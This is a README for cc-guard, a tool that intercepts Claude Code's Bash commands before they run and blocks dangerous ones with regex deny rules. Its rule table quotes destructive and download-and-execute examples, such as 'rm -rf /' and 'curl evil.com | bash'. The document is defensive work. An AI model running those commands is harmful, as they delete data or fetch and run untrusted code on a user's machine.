<p align="center">
  <br />
  <img src="https://img.shields.io/badge/cc--guard-v0.1.0-blue?style=for-the-badge" alt="cc-guard v0.1.0" />
  <img src="https://img.shields.io/badge/runtime-bun-f472b6?style=for-the-badge&logo=bun" alt="Bun" />
  <img src="https://img.shields.io/badge/license-MIT-green?style=for-the-badge" alt="MIT License" />
  <br />
  <br />
</p>

<h1 align="center">cc-guard</h1>

<p align="center">
  <strong>Permission guard for Claude Code.</strong><br />
  Block dangerous commands with regex. Allow everything else. Zero prompts.
</p>

<p align="center">
  <a href="#quick-start">Quick Start</a>&nbsp;&nbsp;&bull;&nbsp;&nbsp;<a href="#how-it-works">How It Works</a>&nbsp;&nbsp;&bull;&nbsp;&nbsp;<a href="#default-deny-rules">Default Rules</a>&nbsp;&nbsp;&bull;&nbsp;&nbsp;<a href="#migrate-from-settingsjson">Migration</a>&nbsp;&nbsp;&bull;&nbsp;&nbsp;<a href="#faq">FAQ</a>
</p>

---

## The Problem

Claude Code's built-in permission system works like a **whitelist** — every new command needs explicit approval. After a week of real usage, your `settings.local.json` looks like this:

```json
{
  "permissions": {
    "allow": [
      "Bash(git fetch origin develop)",
      "Bash(git checkout -b feature/VP-193-st-patricks-day-free origin/develop)",
      "Bash(pnpm --filter web build)",
      "Bash(grep -rn \"onContinueViralShorts\" ...)",
      // ... 92 more rules
    ]
  }
}
```

**96 one-off rules.** Unmanageable. And you're still getting prompted for new commands.

## The Fix

cc-guard flips the model to a **blacklist**. Nine deny rules replace 96 allow entries:

```
 Before                          After
┌─────────────────────────┐    ┌─────────────────────────┐
│ 96 specific allow rules │    │  9 deny rules           │
│ Still getting prompted  │ -> │  Zero prompts           │
│ Grows every session     │    │  Dangerous cmds blocked │
│ Can't share across PCs  │    │  One YAML file          │
└─────────────────────────┘    └─────────────────────────┘
```

## Quick Start

```bash
# Clone and build
git clone https://github.com/goosull/cc-guard.git
cd cc-guard && bun install && bun run build

# Add to PATH (pick one)
echo 'export PATH="$HOME/Documents/cc-guard/dist:$PATH"' >> ~/.zshrc
# or
ln -s ~/Documents/cc-guard/dist/cc-guard /usr/local/bin/cc-guard

# Initialize — creates ~/.cc-guard/ and registers the PreToolUse hook
cc-guard init

# Verify
cc-guard status
```

**That's it.** Every Claude Code session — CLI, VS Code extension, web — now runs through cc-guard.

## How It Works

cc-guard registers as a [PreToolUse hook](https://code.claude.com/docs/en/hooks) in `~/.claude/settings.json`. Claude Code calls it **before every tool execution**:

```
Claude Code invokes a tool
         │
         ▼
   cc-guard check         ← PreToolUse hook fires
         │
    ┌────┴────┐
    │  Deny   │──── yes ──▶ Block (exit 2) + reason to Claude
    │  match? │
    └────┬────┘
         │ no
    ┌────┴────┐
    │  Allow  │──── yes ──▶ Pass (exit 0)
    │  match? │
    └────┬────┘
         │ no
         ▼
    Default: allow          ← Blacklist approach
    (exit 0)
```

- **Runtime**: Pure regex matching. No AI calls. No network. **< 20ms per check.**
- **Fail-open**: If cc-guard crashes, Claude Code continues normally.
- **Logged**: Every decision is recorded to `~/.cc-guard/sessions/` as JSONL.

## Default Deny Rules

Out of the box, cc-guard blocks these patterns:

| Pattern | Catches | Why |
|:--------|:--------|:----|
| `^rm -rf ` | `rm -rf /`, `rm -rf ~/*` | Recursive force delete |
| `^rm -r /` | `rm -r /etc`, `rm -r /usr` | Recursive delete from root |
| `git push --force` | `git push --force origin main` | Force push overwrites history |
| `git push .* --force` | `git push origin main --force` | Force push (flag after remote) |
| `git reset --hard` | `git reset --hard HEAD~5` | Hard reset loses uncommitted work |
| `^sudo ` | `sudo rm -rf /` | Elevated privileges |
| `^chmod 777` | `chmod 777 /var/www` | World-writable permissions |
| `curl .* \| .*(bash\|sh)` | `curl evil.com \| bash` | Download and execute |
| `wget .* -O- \| .*(bash\|sh)` | `wget evil.com -O- \| sh` | Download and execute |

**Deny always beats allow.** Even if `^git ` is in your allow list, `git push --force` is still blocked.

## Compound Command Safety

cc-guard doesn't just check the whole command — it **splits compound commands** and checks each part:

```bash
# Each segment is checked independently
echo "safe" && rm -rf /          # BLOCKED — rm -rf segment caught
cd /tmp && sudo apt install      # BLOCKED — sudo segment caught
git fetch && git status          # ALLOWED — both segments safe

# Quotes are respected
echo "a && b" && echo c          # Only splits on the unquoted &&

# Splits on: && || ; | and newlines
```

## Migrate from settings.json

Already have dozens of rules in `settings.local.json`? Import and compress them:

```bash
$ cc-guard import .claude/settings.local.json

Found 96 allow entries
Import results:
  96 entries → 12 generalized patterns
  Skipped: 8 non-Bash entries

New patterns added:
  + ^git
  + ^pnpm
  + ^node
  + ^gh pr
  ...
```

96 specific entries become ~12 general patterns. The original file is never modified.

## Customize Your Rules

Edit `~/.cc-guard/rules.yaml`:

```yaml
version: 1

deny:
  - pattern: "^rm -rf "
    reason: "Recursive force delete"
  - pattern: "DROP TABLE"
    reason: "SQL table drop"           # Add your own

allow:
  - pattern: "^git "
  - pattern: "^pnpm "
  - pattern: "^docker compose "        # Add your own
```

**Project-specific rules** go in `~/.cc-guard/projects/{name}.yaml` and merge with global rules. Deny rules are always the union — a project can add deny rules but never remove global ones.

## CLI Reference

| Command | Description |
|:--------|:------------|
| `cc-guard init` | Create `~/.cc-guard/`, copy default rules, register hook |
| `cc-guard status` | Show rule counts and today's decision stats |
| `cc-guard log [N]` | Show last N decisions with color-coded deny/allow |
| `cc-guard import [path]` | Compress `settings.local.json` rules into YAML patterns |
| `cc-guard check` | Hook entry point (called by Claude Code, not you) |

## How cc-guard Compares

| | cc-guard | Built-in permissions | [permissions-hook](https://github.com/kornysietsma/claude-code-permissions-hook) | [claude-hooks](https://github.com/liberzon/claude-hooks) |
|:---|:---|:---|:---|:---|
| Approach | Deny-first (blacklist) | Allow-first (whitelist) | Deny + allow | Reuses settings.json |
| Compound commands | Split & check each | No splitting | Block all compounds | Full decomposition |
| Config format | YAML | JSON (settings.json) | TOML | settings.json |
| Rule migration | `cc-guard import` | Manual | Manual | N/A |
| Session logging | JSONL per day | No | Audit log | No |
| Runtime | Bun (single binary) | Built-in | Rust | Python |
| Latency | < 20ms | 0ms | < 5ms | ~50ms |

## FAQ

### Does cc-guard work with the VS Code extension?

**Yes.** cc-guard registers in `~/.claude/settings.json` (global settings), which is read by all Claude Code environments — CLI, VS Code extension, and web app. Just make sure the `cc-guard` binary is in your PATH or use the absolute path in the hook config.

### What happens if cc-guard crashes?

**Nothing bad.** cc-guard is designed to fail-open. If the binary crashes, can't read the rules file, or receives malformed input, it exits with code 0 (allow). Your Claude Code session continues normally.

### Can I use this alongside Claude Code's built-in permissions?

**Yes.** PreToolUse hooks run **before** the built-in permission system. cc-guard handles the blacklist filtering, and Claude Code's built-in system handles everything else. They compose cleanly.

### How do I temporarily disable cc-guard?

Remove or comment out the hook in `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      // {
      //   "matcher": "Bash",
      //   "hooks": [{ "type": "command", "command": "cc-guard check" }]
      // }
    ]
  }
}
```

### Does it support non-Bash tools (Read, Write, Edit)?

The engine supports matching against file paths for Read/Write/Edit/Glob tools, but the hook is currently registered with `matcher: "Bash"` only. Expanding to all tools is planned for a future release.

## Architecture

```
src/
├── cli.ts              Subcommand routing
├── engine.ts           Regex matching engine
│                       ├── normalizeInput()    — trim, collapse whitespace
│                       ├── splitCompoundCommand() — handle &&, ||, ;, |
│                       └── evaluate()          — deny → allow → default
├── rules.ts            YAML loader + global/project merge
├── logger.ts           JSONL session logger
├── types.ts            Shared TypeScript types
└── commands/
    ├── check.ts        PreToolUse hook (stdin → decision → exit code)
    ├── init.ts         Setup ~/.cc-guard/ + register hook
    ├── status.ts       Rule & session statistics
    ├── log.ts          Decision history viewer
    └── import.ts       settings.local.json → YAML migration
```

## Roadmap

- [ ] **LLM-powered rule learning** — Analyze session logs to suggest new deny/allow patterns
- [ ] **Rule validation** — Catch regex errors and deny/allow conflicts before they bite
- [ ] **All-tool support** — Extend beyond Bash to Read, Write, Edit, MCP tools
- [ ] **npm publish** — `npm install -g cc-guard` one-liner install

## Requirements

- [Bun](https://bun.sh/) v1.0+ (for building the binary)
- [Claude Code](https://code.claude.com/) with hooks support

## License

MIT
